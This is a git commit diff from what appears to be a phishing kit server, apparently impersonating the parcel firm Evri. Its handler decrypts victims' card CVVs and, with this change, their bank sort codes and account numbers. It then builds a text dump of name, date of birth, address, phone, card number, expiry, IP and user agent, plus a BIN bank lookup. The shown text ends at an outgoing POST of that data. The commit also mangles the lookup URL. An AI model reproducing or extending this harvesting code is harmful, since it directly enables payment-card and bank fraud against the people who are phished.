af9ad0c83b2aefbd62c59cd41bfc14b9055ddb47
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-08-28 23:48:41 +0100

    make

--- index.js
+++ index.js
@@ -14273,12 +14273,12 @@ app.post("/YardzUnitEvri", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-  //   CryptoJS.enc.Utf8
-  // );
-  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-  //   CryptoJS.enc.Utf8
-  // );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
@@ -14291,7 +14291,7 @@ app.post("/YardzUnitEvri", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(`https:lookup.binlist.net/${bin}`)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -14301,7 +14301,7 @@ app.post("/YardzUnitEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (yardzCount == 10) {
         axios
           .post(
